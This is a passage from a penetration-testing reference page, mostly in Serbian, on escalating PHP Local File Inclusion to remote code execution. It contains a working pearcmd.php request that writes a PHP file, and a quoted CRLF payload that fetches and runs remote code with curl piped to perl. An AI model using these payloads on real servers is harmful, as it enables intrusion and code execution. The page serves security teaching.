As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), skripta `/usr/local/lib/phppearcmd.php` postoji po defaultu u php docker images. Štaviše, moguće je proslediti argumente skripti preko URL-a zato što je naznačeno da ako URL param nema `=`, treba da bude korišćen kao argument. Vidi takođe [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) i [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Sledeći primer zloupotrebljava CRLF vuln da bi dobio RCE (iz [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Preko phpinfo() (file_uploads = on)

Ako ste pronašli **Local File Inclusion** i fajl koji izlaže **phpinfo()** sa file_uploads = on, možete dobiti RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Preko compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Ako ste pronašli **Local File Inclusion** i možete **can exfiltrate the path** privremenog fajla, ALI **server** proverava da li **fajl koji se uključuje ima PHP marks**, možete pokušati da **bypass that check** pomoću ove **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Preko eternal waiting + bruteforce

Ako možete zloupotrebiti LFI da **upload temporary files** i naterate server da **hang** PHP izvršavanje, možete onda **brute force filenames during hours** kako biste pronašli privremeni fajl:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Do Fatal Error

Ako uključite bilo koji od fajlova `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Potrebno je uključiti isti fajl 2 puta da bi se izazvala ta greška).

**Ne znam koliko je ovo korisno, ali možda jeste.**\
_Even if you cause a PHP Fatal Error, PHP temporary files uploaded are deleted._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>

## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
